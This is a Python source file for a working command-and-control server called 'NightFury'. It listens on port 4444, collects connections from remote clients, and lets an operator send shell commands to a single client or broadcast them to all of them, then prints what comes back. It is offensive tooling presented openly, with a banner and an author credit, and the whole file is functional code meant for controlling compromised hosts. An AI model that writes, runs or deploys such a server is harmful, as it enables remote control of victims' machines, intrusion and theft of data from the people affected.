#!/usr/bin/env python3
"""
NightFury C2 Server (debugged)
- Prints colored ASCII banner on startup
- Accepts multiple clients (stored in `clients`)
- Operator menu runs in main thread (safe for input())
- Accept loop runs in background thread
- Clean shutdown on Ctrl+C
"""

import socket
import threading
import signal
import sys
from datetime import datetime

import pyfiglet
from colorama import Fore, Style, init

# ---------------------------
# Banner (exactly like you wanted)
# ---------------------------
init(autoreset=True)


def print_banner():
    # Create ASCII art for tool name
    fig = pyfiglet.Figlet(font="slant")
    ascii_art = fig.renderText("NightFury")

    # Create ASCII art for tagline
    fig2 = pyfiglet.Figlet(font="cybermedium")
    tag = fig2.renderText("Command the Night")

    # Print ASCII art in color (line-by-line to ensure coloring works correctly)
    for line in ascii_art.rstrip("\n").splitlines():
        print(Fore.RED + Style.BRIGHT + line)
    for line in tag.rstrip("\n").splitlines():
        print(Fore.WHITE + Style.BRIGHT + line)

    # Optional: add metadata in different colors
    print(Fore.WHITE + "=" * 100)
    print(Fore.RED + "Author : Rohit")
    print(Fore.RED + "Version: 1.0")
    print(Fore.RED + f"Date   : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(Fore.WHITE + "=" * 100)


# ---------------------------
# Server state
# ---------------------------
clients = {}  # {id: (conn, addr)}
clients_lock = threading.Lock()
server = None  # global server socket
accept_thread = None
next_client_id = 0
running = True


# ---------------------------
# Client session handling
# ---------------------------
def client_session(conn, client_id):
    """Interactive session with a specific client (used when operator selects a client)."""
    try:
        while True:
            cmd = input(f"C2({client_id})> ").strip()
            if cmd.lower() in ("exit", "back"):
                print(f"[i] Detached from Client {client_id}")
                break
            if cmd == "":
                continue

            try:
                conn.sendall(cmd.encode())
            except Exception as e:
                print(f"[!] Error sending to client {client_id}: {e}")
                break

            # Collect response until sentinel
            output_buffer = ""
            while True:
                try:
                    chunk = conn.recv(4096).decode(errors="replace")
                except Exception:
                    chunk = ""
                if not chunk:
                    # connection likely closed
                    print(f"[!] Lost connection to client {client_id}")
                    with clients_lock:
                        if client_id in clients:
                            clients[client_id][0].close()
                            del clients[client_id]
                    return
                output_buffer += chunk
                if "[END OF STREAM]" in output_buffer:
                    output_buffer = output_buffer.replace("[END OF STREAM]", "")
                    break

            # Print output
            print(output_buffer, end="\n")

    except KeyboardInterrupt:
        # Returning to operator menu on Ctrl+C (don't kill whole server)
        print("\n[i] Returning to operator menu")
        return


# ---------------------------
# Broadcast
# ---------------------------
def broadcast_command(cmd):
    """Send a command to all connected clients and print their outputs."""
    with clients_lock:
        if not clients:
            print("[!] No clients connected")
            return
        items = list(clients.items())

    results = []
    for cid, (conn, addr) in items:
        try:
            conn.sendall(cmd.encode())
        except Exception as e:
            print(f"[!] Failed to send to client {cid}: {e}")
            with clients_lock:
                if cid in clients:
                    clients[cid][0].close()
                    del clients[cid]
            continue

        # Read response until sentinel
        output_buffer = ""
        while True:
            try:
                chunk = conn.recv(4096).decode(errors="replace")
            except Exception:
                chunk = ""
            if not chunk:
                print(f"[!] Lost connection to client {cid}")
                with clients_lock:
                    if cid in clients:
                        clients[cid][0].close()
                        del clients[cid]
                break
            output_buffer += chunk
            if "[END OF STREAM]" in output_buffer:
                output_buffer = output_buffer.replace("[END OF STREAM]", "")
                results.append((cid, output_buffer.strip()))
                break

    # Print results
    for cid, output in results:
        print(Fore.RED + f"\n--- Client {cid} ---\n{ Fore.WHITE + output}\n")


# ---------------------------
# Shutdown
# ---------------------------
def shutdown_server(signum=None, frame=None):
    """Gracefully stop server and all clients"""
    global running, server
    running = False
    print("\n[*] Stopping server and closing all clients...")
    with clients_lock:
        for cid, (conn, addr) in list(clients.items()):
            try:
                conn.sendall(b"exit")
            except Exception:
                pass
            try:
                conn.close()
            except Exception:
                pass
            if cid in clients:
                del clients[cid]
    try:
        if server:
            server.close()
    except Exception:
        pass
    # If we are called from signal handler, exit:
    sys.exit(0)


# ---------------------------
# Operator menu (runs in main thread)
# ---------------------------
def operator_menu():
    """Main operator interface — runs in the main thread (safe for input())."""
    global clients
    try:
        while running:
            cmd = input("C2> ").strip()
            if not cmd:
                continue

            if cmd == "list":
                with clients_lock:
                    if not clients:
                        print("No clients connected")
                    else:
                        for cid, (conn, addr) in clients.items():
                            print(f"{cid} - {addr[0]}:{addr[1]}")

            elif cmd.startswith("select "):
                try:
                    cid = int(cmd.split()[1])
                    with clients_lock:
                        if cid in clients:
                            client_conn = clients[cid][0]
                        else:
                            print("[!] Invalid client ID")
                            continue
                    client_session(client_conn, cid)
                except ValueError:
                    print("[!] Usage: select <id>")

            elif cmd.startswith("broadcast "):
                broadcast_cmd = cmd[len("broadcast "):].strip()
                if broadcast_cmd:
                    broadcast_command(broadcast_cmd)
                else:
                    print("[!] Usage: broadcast <command>")

            elif cmd in ("quit", "stop"):
                print("Exiting C2...")
                shutdown_server()

            elif cmd == "help":
                print(f"Commands: list, select <id>, broadcast <cmd>, quit/stop, help")

            else:
                print("Commands: list, select <id>, broadcast <cmd>, quit/stop, help")

    except (KeyboardInterrupt, EOFError):
        # Ctrl+C in operator menu => shutdown
        shutdown_server()


# ---------------------------
# Accept loop (runs in background thread)
# ---------------------------
def accept_loop(listen_sock):
    """Accept incoming client connections."""
    global next_client_id
    while running:
        try:
            conn, addr = listen_sock.accept()
            with clients_lock:
                next_client_id += 1
                cid = next_client_id
                clients[cid] = (conn, addr)
            print(f"\n[+] Client {cid} connected from {addr}")
        except OSError:
            # Socket closed or interrupted
            break
        except Exception as e:
            # Unexpected error — continue accepting
            print(f"[!] Accept error: {e}")
            continue


# ---------------------------
# Start server (setup socket and accept thread)
# ---------------------------
def start_server(host="0.0.0.0", port=4444):
    global server, accept_thread
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((host, port))
    server.listen(5)
    print(f"[*] Listening on {host}:{port}")

    # start accept loop in a background thread
    accept_thread = threading.Thread(target=accept_loop, args=(server,), daemon=True)
    accept_thread.start()


# ---------------------------
# Main
# ---------------------------
if __name__ == "__main__":
    # Hook Ctrl+C to shutdown_server
    signal.signal(signal.SIGINT, shutdown_server)

    # Print banner and start server
    print_banner()
    start_server(host="0.0.0.0", port=4444)

    # Run operator menu in main thread (safe for input)
    operator_menu()
